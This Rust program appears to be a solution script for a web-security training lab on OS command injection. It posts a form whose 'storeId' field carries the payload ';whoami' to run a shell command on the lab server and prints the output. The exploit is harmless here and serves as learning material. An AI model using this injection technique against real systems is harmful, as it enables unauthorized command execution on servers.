/**************************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 10/10/2023
*
* Lab: OS command injection, simple case
*
* Steps: 1. Inject payload into "storeId" parameter to execute the `whoami` command
*        2. Observe the `whoami` output in the response
*
***************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a02005b04a4d8688266adcf00ff00f4.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!(
        "{} {}",
        "❯ Injection point:".blue(),
        "storeId".yellow(),
    );

    // the payload to execute the `whoami` command
    let payload = ";whoami";

    print!(
        "{}",
        "❯ Injecting payload to execute the `whoami` command.. ".white(),
    );
    io::stdout().flush();

    // fetch the page with the injected payload
    let injection = client
        .post(format!("{url}/product/stock"))
        .form(&HashMap::from([("productId", "2"), ("storeId", payload)]))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the page with the injected payload".red()
        ));

    // the response contains the output of the `whoami` command
    let whoami = injection.text().unwrap();

    print!("{} => {}", "OK".green(), whoami.yellow());
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
